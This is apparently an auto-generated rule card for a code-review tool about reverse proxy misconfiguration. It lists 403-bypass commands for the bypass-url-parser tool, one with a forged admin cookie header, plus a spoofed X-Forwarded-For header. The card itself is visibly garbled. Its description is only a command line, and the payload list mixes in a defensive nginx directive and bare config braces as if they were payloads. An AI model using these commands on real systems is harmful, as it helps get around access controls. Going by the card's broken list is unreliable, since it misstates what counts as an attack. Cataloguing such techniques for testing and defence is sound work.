# Reverse Proxy Misconfig — @proxybend skill
> cats: (advisory — no static taint rule yet) · severity: medium
> sources: PayloadsAllTheThings, HackTricks

## What it is
bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d

## Exploit payloads (from PayloadsAllTheThings)
- `bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d`
- `bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"`
- `bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths"`
- `X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3`
- `proxy_set_header X-Forwarded-For $remote_addr;`
- `server {`
- `location /app/ {`
- `}`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Reverse%20Proxy%20Misconfigurations
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Reverse%20Proxy%20Misconfig
- HackTricks Cloud: https://cloud.hacktricks.wiki/
